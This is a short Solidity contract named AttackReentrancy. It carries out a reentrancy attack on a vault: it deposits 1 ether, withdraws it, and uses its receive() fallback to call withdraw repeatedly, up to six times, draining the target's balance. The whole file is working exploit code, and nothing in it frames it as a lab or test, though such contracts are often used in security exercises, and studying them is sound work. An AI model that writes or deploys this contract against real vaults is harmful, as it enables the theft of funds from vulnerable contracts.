// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract AttackReentrancy {
    IVault public target;
    uint256 public attackCount;
    uint256 public maxAttack = 6;

    constructor(address _target) {
        target = IVault(_target);
    }

    receive() external payable {
        if (attackCount < maxAttack && address(target).balance > 0) {
            attackCount++;
            target.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "need >= 1 ETH");
        target.deposit{value: 1 ether}();
        target.withdraw(1 ether);
    }
}
